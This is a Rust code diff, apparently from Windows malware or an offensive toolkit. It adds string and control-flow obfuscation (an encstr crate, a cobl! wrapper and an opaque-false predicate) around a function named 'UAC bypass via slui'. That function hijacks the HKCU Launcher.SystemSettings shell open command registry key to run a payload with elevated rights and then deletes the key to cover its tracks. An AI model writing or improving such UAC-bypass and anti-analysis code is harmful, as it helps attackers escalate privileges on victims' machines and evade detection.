@@ -1,8 +1,8 @@
-use winreg::enums;
+use encstr::{astr, cobl, opaque_false};
 use std::process::{Command, Stdio};
 use std::thread;
 use std::time::Duration;
-use encstr::astr;
+use winreg::enums;
 
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
@@ -59,6 +59,10 @@ pub fn launch_with_fsr_disabled(program: &str) -> std::io::Result<()> {
 
 /// UAC bypass via slui
 pub fn uac_slui(payload: &String) {
+    cobl!({
+    if opaque_false() {
+        return;
+    }
     let path = astr!("Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command");
 
     let _ = delete_hkcu_key(&path);
@@ -68,7 +72,7 @@ pub fn uac_slui(payload: &String) {
         return;
     }
 
-    if let Err(_) =         set_hkcu_value(&path, Some(astr!("DelegateExecute").as_str()), None, true) {
+    if let Err(_) = set_hkcu_value(&path, Some(astr!("DelegateExecute").as_str()), None, true) {
         let _ = delete_hkcu_key(&path);
         return;
     }
@@ -87,4 +91,5 @@ pub fn uac_slui(payload: &String) {
         thread::sleep(Duration::from_secs(5));
         let _ = delete_hkcu_key(&cleanup_path);
     });
+    })
 }
